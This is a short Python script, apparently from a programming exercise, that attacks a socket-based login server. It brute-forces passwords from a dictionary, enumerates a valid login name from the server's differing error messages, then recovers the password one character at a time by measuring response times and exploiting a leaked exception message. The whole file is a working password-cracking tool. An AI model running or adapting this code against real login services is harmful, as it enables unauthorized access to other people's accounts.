from socket import socket
from finder import DictionnaryPassword
from json import dumps,loads
from string import ascii_letters
from itertools import cycle
from datetime import datetime

class Client:
    size_buffer = 2048

    def __init__(self,address):
        self.address=address

    def __enter__(self):
         self.client = socket()
         self.client.connect(self.address)
         return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.client.close()

    def set_finder(self,finder):
        self.finder = finder

    def search(self):
          for password in self.finder.find_password():
              self.client.send(password.encode())
              response = self.client.recv(self.size_buffer).decode()
              if response == "Connection success!":
                    print(password)
                    break



def get_time(f):
    def wrapper(self,**args):
        start = datetime.now()
        result = f(self,**args)
        end = datetime.now()
        result["time"] = (end-start).microseconds
        return result
    return wrapper


def payload(**args):

    return dumps(args)


class ClientLogin(Client):
    def __init__(self,address):
        super().__init__(address)

    @get_time
    def send(self,**data):
        self.client.send(payload(**data).encode())
        return loads(self.client.recv(self.size_buffer).decode())


    def search(self):
        logins = DictionnaryPassword("./hacking/logins.txt")
        login_find = ""
        for login in logins.find_password():
            response = self.send(login=login,password=" ")
            if  response["result"] == "Wrong password!":
                login_find=login
                break


        password=""
        time_response = []
        for letter in ascii_letters:
           response = self.send(login=login_find,password=letter)
           time_response.append(response["time"])

        average_time= sum(time_response)/len(time_response)


        for letter in cycle(ascii_letters+"0123456789"):

            test_password = password  + letter

            response=self.send(login=login_find,password=test_password)

            if response["time"] > average_time:
                password+=letter
            if response["result"]=="Exception happened during login":
                password+=letter
            elif response["result"]=="Connection success!":
                print(payload(login=login_find,password=password+letter))
                break










